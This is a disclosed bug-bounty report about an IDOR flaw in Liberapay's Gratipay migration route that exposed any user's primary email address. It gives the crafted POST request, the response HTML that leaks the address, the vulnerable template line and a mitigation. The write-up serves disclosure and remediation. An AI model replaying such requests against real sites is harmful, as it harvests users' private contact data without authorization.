---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1727044'
original_report_id: '1727044'
title: Email Address Exposure via Gratipay Migration Tool
weakness: Insecure Direct Object Reference (IDOR)
team_handle: liberapay
created_at: '2022-10-07T22:40:56.570Z'
disclosed_at: '2022-10-09T11:50:43.637Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 27
asset_identifier: '*.liberapay.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# Email Address Exposure via Gratipay Migration Tool

## Metadata

- HackerOne Report ID: 1727044
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: liberapay
- Disclosed At: 2022-10-09T11:50:43.637Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Through the `/migrate` route, an attacker can input the username of any user on the site and retrieve their primary email address without any authorization required.

# Steps to reproduce:

#### Note: This cannot be performed with `hackerone-target`, because that account seems to return a `None` as an email.
1. Craft and post an HTTP request that fakes step 1 of the migration process through Gratipay, with any email in the `email_address` field and the target's username in the `username` field.
```http
POST /migrate?step=2 HTTP/1.1
Host: liberapay.com
Cookie: XXXXXXX
X-CSRF-TOKEN: XXXXXXX
Content-Type: application/x-www-form-urlencoded

email_address=suprnova+gratipay@wearehackerone.com&username=suprnova
```
2. Examine the HTML of the response.
```html
<form action="" method="POST">
  <input type="hidden" name="form.repost" value="true" />
  <input type="hidden" name="email_address" value="suprnova+gratipay@wearehackerone.com" />
  <input type="hidden" name="username" value="suprnova" />
  <div class="alert alert-danger">The username &#39;<a href="/Suprnova/">Suprnova</a>&#39; is already taken.</div>
  <p>Does this existing account belong to you?</p>
  <p class="buttons">
    <button class="btn btn-default btn-lg"
      name="log-in.id" value="suprnova+very-secret-email-address@wearehackerone.com"
      >Yes</button>
    <button class="btn btn-default btn-lg"
      name="ignore-conflict" value="true"
      >No</button>
  </p>
</form>
```
The `value` field for `log-in.id` has been automatically populated with the primary email address of the target.

# Vulnerable Code
The problematic code can be found in the file [www/migrate.spt:349](https://github.com/liberapay/liberapay.com/blob/1f1a4b605def37aa9bed55586c7425a819c3fcdf/www/migrate.spt#L349).
```html
<p class="buttons">
  <button class="btn btn-default btn-lg"
    name="log-in.id" value="{{ existing_account.email }}"
    >{{ _("Yes") }}</button>
  <button class="btn btn-default btn-lg"
    name="ignore-conflict" value="true"
    >{{ _("No") }}</button>
</p>
```
The website automatically displays the email address of the existing account, despite the current user's lack of authorization to view that information.

# Mitigation:
To mitigate this exposure, the value for "log-in.id" could instead refer to the ID number of the account being referred to.

## Impact

A malicious attacker could simply identify any user on the site and instantly access their email address from the database to be used elsewhere, regardless of the victim's privacy settings.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
